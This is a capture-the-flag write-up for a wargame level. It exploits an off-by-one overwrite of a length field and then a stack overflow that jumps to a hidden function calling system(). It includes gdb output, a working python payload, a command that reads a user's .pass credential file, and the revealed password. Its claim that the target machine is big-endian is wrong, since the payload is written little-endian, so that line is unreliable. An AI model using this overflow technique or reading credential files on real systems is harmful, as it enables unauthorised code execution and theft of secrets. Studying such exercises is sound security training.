## level09

This level is somewhat convoluted. The goal will be to reach this unused backdoor function:

```c
void secret_backdoor() {
    char s[128];
    fgets(s, 128, stdin);
    system(s);
}
```

The function `handle_msg` sets up a buffer with:
- 140 uninitialized chars for the message,
- 40 null bytes for the username,
- an integer with a value of 140 which represents indirectly the maximum message length.

The function `set_username` reads a username from `stdin` and writes the first 41 chars to the middle of the buffer. It is likely an off-by-one error, which will allow us to overwrite the maximum message length.

```c
for (int i = 0; i <= 40 && username[i]; ++i) {
    buf[i + 140] = username[i];
}
```

The `set_msg` function reads a message from `stdin` and writes it at the start of the buffer, with the limit set at 140 that we will overwrite.

The machine is big-endian so if we give 40 dummy chars for the username and the maximum byte of 255, the message length will be 255.

For the message, we know the buffer is 192 bytes long, and we need to skip 8 more bytes with the saved `rbp`. We'll need to write 200 characters followed by the address of `secret_backdoor` to overwrite the return address.

```nasm
(gdb) disas handle_msg
Dump of assembler code for function handle_msg:
   0x00005555555548c0 <+0>:     push   rbp
   0x00005555555548c1 <+1>:     mov    rbp,rsp
   0x00005555555548c4 <+4>:     sub    rsp,0xc0
```

The last information we need is the address of `secret_backdoor`:

```
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

The full payload is:
- 40 dummy bytes for the username
- the byte 255 for the message length
- newline
- 200 dummy bytes for the message
- the address of `secret_backdoor`

```
level09@OverRide:~$ (
python -c "
print('A' * 40 + '\xff\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00');
";
cat
) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/$(whoami)/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```